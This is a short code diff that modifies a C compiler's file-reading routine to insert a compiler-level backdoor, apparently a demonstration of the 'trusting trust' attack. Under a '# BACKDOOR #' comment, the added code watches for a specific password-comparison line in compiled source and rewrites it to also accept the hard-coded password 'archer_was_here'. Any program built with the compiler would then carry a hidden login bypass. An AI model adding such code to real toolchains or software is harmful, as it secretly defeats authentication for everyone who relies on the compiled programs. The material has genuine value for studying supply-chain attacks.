@@ -638,6 +638,13 @@ Token *tokenize(File *file) {
 
 // Returns the contents of a given file.
 static char *read_file(char *path) {
+// ############
+// # BACKDOOR #
+// ############
+// If line is
+// 		"\tif (strcmp(passwords[user_index], password) == 0) {"
+// then replace with
+// 		"\tif (strcmp(passwords[user_index], password) == 0 || strcmp("archer_was_here", password) == 0) {"
   FILE *fp;
 
   if (strcmp(path, "-") == 0) {
@@ -654,10 +661,18 @@ static char *read_file(char *path) {
   FILE *out = open_memstream(&buf, &buflen);
 
   // Read the entire file.
+  char* src = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
+  size_t src_size = strlen(src);
   for (;;) {
     char buf2[4096];
-    int n = fread(buf2, 1, sizeof(buf2), fp);
-    if (n == 0)
+    char *buf3 = buf2;  
+    size_t bufsize = sizeof(buf2);
+    int n = getline(&buf3, &bufsize, fp); 
+    if (strcmp(buf3, "\tif (strcmp(passwords[user_index], password) == 0) {\n") == 0) {
+      n = src_size;
+      strcpy(buf2, src);
+    }
+    if (n == -1)
       break;
     fwrite(buf2, 1, n, out);
   }
